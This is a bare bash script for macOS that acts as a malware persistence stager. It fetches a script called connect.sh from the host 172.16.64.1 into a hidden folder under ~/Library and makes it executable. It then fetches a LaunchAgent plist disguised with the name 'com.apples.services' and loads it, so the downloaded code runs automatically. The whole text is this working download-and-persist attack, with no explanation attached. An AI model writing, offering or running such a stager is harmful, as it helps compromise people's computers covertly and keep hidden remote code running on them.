#!/bin/bash
mkdir -p ~/Library/.hidden
curl http://172.16.64.1:8000/connect.sh > ~/Library/.hidden/connect.sh
chmod +x ~/Library/.hidden/connect.sh
mkdir -p ~/Library/LaunchAgents
curl http://172.16.64.1:8000/com.apples.services.plist > ~/Library/LaunchAgents/com.apples.services.plist
chmod 600 ~/Library/LaunchAgents/com.apples.services.plist
launchctl load ~/Library/LaunchAgents/com.apples.services.plist
